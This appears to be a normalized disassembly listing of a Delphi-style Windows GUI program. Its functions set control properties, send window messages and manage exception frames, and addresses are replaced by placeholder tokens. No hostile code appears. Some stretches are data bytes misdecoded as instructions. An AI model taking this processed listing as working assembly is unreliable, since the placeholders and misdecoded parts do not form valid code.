mov [ ebx + 0x228 ] dl
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax ebx
call sub_4598e8
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_442824
push ebx
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x208 ] dl
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax ebx
call sub_4598e8
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_442860
push ebx
mov ebx eax
cmp dl [ ebx + 0x21e ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x21e ] dl
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax ebx
call sub_4598e8
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_44289c
push ebx
mov ebx eax
cmp dl [ ebx + 0x21f ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x21f ] dl
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax ebx
call sub_4598e8
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_4428d8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax esi
call sub_419b1c
mov [ ebx + 0x28 ] eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_419730
mov [ ebx + 0x24 ] 0x32
mov [ ebx + 0xc ] 0x0
or eax 0xffffffff
mov [ ebx + 0x1c ] eax
mov [ ebp - 0x21 ] 0x3
xor edx edx
mov [ ebp - 0x1d ] edx
mov edx [ ebx + 0x24 ]
mov [ ebp - 0x19 ] edx
mov [ ebp - 0x9 ] eax
mov edi esi
mov eax edi
call sub_442eb4
call sub_45c684
test al al
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_4197bc
push eax
mov eax edi
call sub_442eb4
call sub_45c380
lea ecx [ ebp - 0x21 ]
pop edx
call sub_42c864
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_442980
push ebx
push esi
push edi
push ebp
call sub_4035b8
mov ebx edx
mov ebp eax
mov edi [ ebp + 0x4 ]
mov esi edi
mov eax edi
call sub_442eb4
call sub_45c684
test al al
je r-xdata
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_419768
mov eax esi
call sub_442ef0
test bl bl
jle r-xdata
mov eax ebp
call sub_4197bc
push eax
mov eax [ ebp + 0x4 ]
call sub_442eb4
call sub_45c380
pop edx
call sub_42c874
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4035a0
sub_4429e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4194c4
push ebx
push r-xdata
push ebx
push sub_442a50
cmp [ ebx + 0x24 ] 0xffffffff
setle cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_442a26
add [ eax ] al
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_41d5f0
mov eax ebx
call sub_41d540
mov edx eax
mov eax esi
call sub_442cfc
mov eax ebx
call sub_41d5f8
pop esi
pop ebx
retn
sub_442a50
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_41f824
mov edx [ esi + 0x24 ]
mov eax ebx
call sub_41f758
mov eax ebx
call sub_41f82c
pop esi
pop ebx
retn
sub_442a74
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_442eb4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_45c684
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x289 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x248 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_41b420
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x248 ] eax
jmp r-xdata
push 0x400
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x248 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41be14
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_442b5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_41ef98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4031ec
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x248 ]
call sub_41b3bc
retn
sub_442b70
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_419b1c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_419b1c
cmp esi eax
setne dl
mov eax [ ebp - 0x4 ]
call sub_419798
push ebp
call sub_442a74
pop ecx
pop esi
pop ebx
pop ecx
pop ebp
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_419b24
cmp [ eax + 0x24 ] 0xffffffff
jle r-xdata
sub_442bcc
shr [ ebx ] 0x1
inc esp
add [ ecx ] dl
add ebp [ esi ]
cmp [ esi ] dh
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
push esp
adc [ eax ] al
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
call [ eax - 0x75 ]
inc esi
add al 0xe8
dec esp
add al [ eax ]
add al ch
adc edx [ edi + 0x4d8b0001 ]
cld
insb
jae r-xdata
inc ebp
cld
mov eax [ eax + 0x4 ]
call sub_419b1c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
rcl [ ebp - 0x75 ] 0xec
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_442c92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4198e4
mov eax [ esi + 0x4 ]
call sub_419b1c
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ sub_442bcc ]
call sub_4051b4
add esp 0x4
mov eax [ esi + 0x4 ]
call sub_419b1c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_419b1c
cmp esi eax
setne dl
mov eax [ ebp - 0x4 ]
call sub_419798
push ebp
call sub_442a74
pop ecx
pop esi
pop ebx
pop ecx
pop ebp
retn
inc ebx
xor esi esi
pop edx
call sub_42ca7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442c99
lea eax [ ebp - 0x4 ]
mov edx [ sub_442bcc ]
call sub_4051c0
retn
mov eax [ esi + 0x4 ]
call sub_419b1c
push eax
mov eax [ esi + 0x4 ]
call sub_442eb4
call sub_45c380
mov ecx [ ebp - 0x4 ]
inc edi
xor ebx ebx
inc esi
dec ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_419b24
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_419b24
cmp [ eax + 0x24 ] 0xffffffff
jle r-xdata
sub_442ca0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx esi
call sub_404388
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_403fd0
mov eax ebx
call sub_442b70
sub_442cc8
push ebx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
pop ebx
retn
mov eax ebx
call sub_4197bc
push eax
mov eax [ ebx + 0x4 ]
call sub_442eb4
call sub_45c380
pop edx
call sub_42c88c
mov [ ebx + 0x24 ] eax
sub_442cfc
cmp edx [ eax + 0x24 ]
je r-xdata
retn
mov ecx [ eax + 0x18 ]
cmp edx ecx
jge r-xdata
mov ecx [ eax + 0x14 ]
test ecx ecx
jle r-xdata
test edx edx
jl r-xdata
mov [ eax + 0x24 ] edx
call sub_442b70
cmp ecx edx
jge r-xdata
mov edx ecx
jmp r-xdata
mov edx ecx
sub_442d28
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4197bc
test eax eax
je r-xdata
mov [ esi + 0xc ] bl
xor edx edx
mov eax esi
call sub_419798
mov eax [ esi + 0x4 ]
call sub_442eb4
mov edx [ eax ]
call [ edx + 0x80 ]
sub_442d60
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0xd ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xd ] dl
mov eax [ ebx + 0x4 ]
call sub_442eb4
test eax eax
je r-xdata
mov eax ebx
call sub_442b70
mov eax [ ebx + 0x4 ]
call sub_442eb4
mov si 0xffee
call sub_4033e8
sub_442dc4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4193d8
pop esi
pop ebx
retn
mov dl [ esi + 0xc ]
mov eax ebx
call sub_442d28
mov dl [ esi + 0xd ]
mov eax ebx
call sub_442d60
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_442ca0
mov edx [ esi + 0x1c ]
mov eax ebx
call sub_442d94
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_442da4
mov edx [ esi + 0x18 ]
mov eax ebx
call sub_442db4
mov eax esi
call sub_442cc8
mov edx eax
mov eax ebx
call sub_442cfc
pop esi
pop ebx
retn
sub_442e38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_403fd0
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4197d4
sub_442e5c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_419914
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_442ebc
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_442eb4
call sub_447508
pop esi
pop ebx
retn
mov eax esi
call sub_4197bc
push eax
mov eax ebx
call sub_442eb4
pop edx
call sub_447548
pop esi
pop ebx
retn
sub_442ef0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_442eb4
call sub_45c684
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_442fcb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419b1c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_419b1c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_442eb4
call sub_45c380
mov edx ebx
call sub_42c874
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_442eb4
call sub_447508
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc esi
xor ebx ebx
mov [ edi ] 0x3
xor eax eax
mov [ edi + 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442ea0
mov eax [ eax + 0x24 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_442eb4
call sub_45c380
mov ecx edi
mov edx ebx
call sub_42c864
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442ea0
mov [ eax + 0x28 ] ebx
inc ebx
dec esi
jne r-xdata
sub_442fdc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419730
mov [ esi + 0x20 ] 0xff000008
lea eax [ esi + 0x1c ]
call sub_403f7c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_443034
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_403fd0
mov dl 0x1
mov eax ebx
call sub_419798
pop esi
pop ebx
retn
sub_443064
inc [ eax ]
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
jo r-xdata
insb
jae r-xdata
fimul [ ebx + 0x6a24e8c7 ]
std
call [ eax - 0x75 ]
inc ebp
clc
lea edi [ ecx + edx * 8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
inc ebx
dec esi
jne r-xdata
lea eax [ esi + 0x1c ]
call sub_403f7c
mov eax esi
test bl bl
je r-xdata
rcl [ ebp - 0x75 ] 0xec
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_44312e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xffff
call sub_4033e8
mov [ ebp - 0x8 ] eax
mov eax edi
call sub_419b1c
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051b4
add esp 0x4
mov eax edi
call sub_419b1c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax edi
call sub_44313c
mov edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
push esi
push edi
lea esi [ eax + 0xc ]
call sub_45c380
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42cab4
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443135
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4051c0
retn
mov eax edi
call sub_419b1c
push eax
mov eax [ ebp - 0x8 ]
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
inc esi
xor ebx ebx
sub_443264
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
mov [ edi + 0x30 ] esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ edi + 0x34 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4432b0
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41ad48
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4432e0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41ada4
mov esi eax
or edx 0xffffffff
mov eax [ ebx + 0x34 ]
call sub_418c68
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_443414
mov eax esi
pop esi
pop ebx
retn
sub_443308
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41adb0
mov esi eax
or edx 0xffffffff
mov eax [ ebx + 0x34 ]
call sub_418c68
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_443414
mov eax esi
pop esi
pop ebx
retn
sub_443344
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41ae8c
mov edx esi
mov eax [ ebx + 0x34 ]
call sub_418cb4
mov eax [ ebx + 0x30 ]
call sub_4435f8
pop esi
pop ebx
retn
sub_443374
push ebx
push esi
mov esi edx
mov eax [ eax + 0x30 ]
call sub_443528
mov ebx eax
mov eax ebx
call sub_445894
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x23c ]
call sub_419b1c
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
call sub_44729c
cmp [ eax + 0x24 ] 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_447548
sub_4433b8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_41b0c4
or ecx 0xffffffff
mov edx ebx
mov eax [ esi + 0x34 ]
call sub_418e40
lea edi [ ebx + 0x1 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
sub ebx edi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx edi
mov eax esi
call sub_443414
inc edi
dec ebx
jne r-xdata
sub_4433f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41b1a0
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_443414
pop esi
pop ebx
retn
sub_443414
push ebx
push esi
mov esi edx
mov ebx eax
push 0xffffffff
mov eax [ ebx + 0x30 ]
call sub_443a48
push eax
mov eax ebx
call sub_443368
mov ecx esi
pop edx
call sub_42c9e8
mov edx esi
mov eax ebx
call sub_443374
pop esi
pop ebx
retn
sub_44346c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_443264
mov [ esi + 0x8 ] eax
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4434bc
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov [ esi + 0x28 ] 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp esi [ eax + 0x270 ]
jne r-xdata
mov eax esi
call sub_443528
call sub_45c684
test al al
je r-xdata
xor edx edx
mov [ eax + 0x270 ] edx
mov eax [ esi + 0x8 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193ac
test bl bl
jle r-xdata
mov eax esi
call sub_443a48
push eax
mov eax esi
call sub_443554
pop edx
call sub_42c754
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_443568
push ebx
push esi
mov esi eax
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
mov al [ esi + 0x2a ]
pop esi
pop ebx
retn
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax esi
call sub_443a48
push eax
mov eax ebx
call sub_45c380
pop edx
call sub_42c99c
test eax eax
setne al
pop esi
pop ebx
retn
sub_4435ac
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax edi
call sub_443568
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edi + 0x2a ] bl
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x4 ]
cmp [ esi + 0x244 ] 0x0
jne r-xdata
mov eax esi
call sub_45c684
test al al
je r-xdata
mov eax edi
call sub_443a48
push eax
mov eax esi
call sub_45c380
mov ecx ebx
pop edx
call sub_42c9bc
sub_443614
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x24 ]
call sub_404388
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x24 ]
mov edx esi
call sub_403fd0
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov eax ebx
call sub_443528
call sub_445894
test al al
je r-xdata
push 0xffffffff
mov eax ebx
call sub_443a48
push eax
mov eax ebx
call sub_443554
xor ecx ecx
pop edx
call sub_42c9e8
mov eax ebx
call sub_443528
mov al [ eax + 0x229 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov eax ebx
call sub_443528
mov eax [ eax + 0x23c ]
call sub_419b1c
test eax eax
jle r-xdata
mov eax ebx
call sub_443528
call sub_447040
mov eax ebx
call sub_443528
xor edx edx
call sub_44729c
cmp [ eax + 0x24 ] 0xffffffff
jg r-xdata
mov eax ebx
call sub_443528
call sub_447508
sub_4436c4
push ebx
mov ebx eax
cmp edx [ ebx + 0xc ]
je r-xdata
pop ebx
retn
mov [ ebx + 0xc ] edx
mov eax ebx
call sub_443528
mov al [ eax + 0x229 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_443528
call sub_447040
sub al 0x2
jne r-xdata
sub_4436f4
push ebx
push esi
mov esi eax
cmp edx 0x4
ja r-xdata
xor ebx ebx
jmp [ edx * 4 + jump_table_443704 ]
mov ebx 0x4
jmp r-xdata
mov ebx 0x8
jmp r-xdata
mov ebx 0x1
jmp r-xdata
mov ebx 0x2
jmp r-xdata
mov ebx 0x20
jmp r-xdata
mov eax esi
call sub_443a48
push eax
mov eax esi
call sub_443554
mov ecx ebx
pop edx
call sub_42c98c
test eax ebx
setne al
pop esi
pop ebx
retn
sub_44375c
push ebx
push esi
push edi
mov ebx eax
cmp edx 0x4
ja r-xdata
xor esi esi
jmp [ edx * 4 + jump_table_44376d ]
xor edi edi
mov edi esi
jmp r-xdata
mov esi 0x4
jmp r-xdata
mov esi 0x8
jmp r-xdata
mov esi 0x1
jmp r-xdata
mov esi 0x2
jmp r-xdata
mov esi 0x20
jmp r-xdata
push esi
mov eax ebx
call sub_443a48
push eax
mov eax ebx
call sub_443554
mov ecx edi
pop edx
call sub_42c95c
pop edi
pop esi
pop ebx
retn
test cl cl
je r-xdata
sub_4437cc
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi ecx
mov esi eax
xor ebx ebx
sub edx 0x1
jb r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov [ esi + 0x10 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi [ esi + 0x1c ]
je r-xdata
dec edx
je r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax esi
call sub_443a48
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax esi
call sub_443554
mov edx esp
call sub_42c724
jmp r-xdata
mov bl 0x1
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi [ esi + 0x20 ]
je r-xdata
jmp r-xdata
mov eax esi
call sub_443a48
push eax
mov eax esi
call sub_443a48
push eax
mov eax esi
call sub_443528
pop edx
pop ecx
call sub_445194
push 0xf00
mov eax [ esi + 0x1c ]
inc eax
call sub_42c640
push eax
mov eax esi
call sub_443a48
push eax
mov eax esi
call sub_443554
pop edx
pop ecx
call sub_42c95c
jmp r-xdata
mov bl 0x1
mov [ esi + 0x20 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
push 0xf000
lea eax [ edi + 0x1 ]
call sub_42c708
push eax
mov eax esi
call sub_443a48
push eax
mov eax esi
call sub_443554
pop edx
pop ecx
call sub_42c95c
xor edi edi
sub_443908
push ebx
add esp 0xffffffd8
mov ebx eax
cmp edx [ ebx + 0x14 ]
je r-xdata
add esp 0x28
pop ebx
retn
mov [ ebx + 0x14 ] edx
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x10
mov [ esp + 0x24 ] edx
mov eax ebx
call sub_443a48
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_443554
mov edx esp
call sub_42c724
mov eax ebx
call sub_443a48
push eax
mov eax ebx
call sub_443a48
push eax
mov eax ebx
call sub_443528
pop edx
pop ecx
call sub_445194
sub_443974
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4193d8
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40339c
mov esi eax
mov edx [ esi + 0x24 ]
mov eax ebx
call sub_443614
mov edx [ esi + 0xc ]
mov eax ebx
call sub_4436c4
mov ecx [ esi + 0x10 ]
xor edx edx
mov eax ebx
call sub_4437cc
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_443908
mov ecx [ esi + 0x1c ]
mov edx 0x1
mov eax ebx
call sub_4437cc
mov ecx [ esi + 0x20 ]
mov edx 0x2
mov eax ebx
call sub_4437cc
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_443a34
mov eax esi
call sub_443568
mov edx eax
mov eax ebx
call sub_4435ac
pop esi
pop ebx
retn
sub_443a0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x24 ]
mov edx [ esi + 0x24 ]
call sub_404388
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
cmp eax [ esi + 0xc ]
sub_443a64
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_443a48
push eax
mov eax esi
call sub_443554
mov ecx edi
pop edx
call sub_42c7b4
pop edi
pop esi
pop ebx
retn
sub_443aa0
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_44344c
cmp edi eax
je r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov ecx edi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_443460
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax ebx
call sub_443a48
mov [ esp + 0x4 ] eax
inc esi
mov [ esp + 0x8 ] esi
mov eax ebx
call sub_443554
mov edx esp
call sub_42c724
sub_443b0c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_443b48
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_443cc4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193ac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_443b80
push ebx
push esi
push edi
add esp 0xffffffd8
mov esi ecx
mov ebx eax
test edx edx
jne r-xdata
mov edi edx
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0xf8 ]
mov edi eax
jmp r-xdata
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_4444e4
push esp
mov eax ebx
call sub_443bf4
pop edx
call sub_42c73c
mov eax edi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_443bd0
mov esi eax
test esi esi
jge r-xdata
sub_443bd0
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_45c684
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_443bf4
call sub_42c6f8
pop ebx
retn
sub_443c00
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x4 ]
call sub_45c684
test al al
je r-xdata
mov eax esi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov [ esp ] 0x4
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_443bf4
mov edx esp
call sub_42c70c
test eax eax
je r-xdata
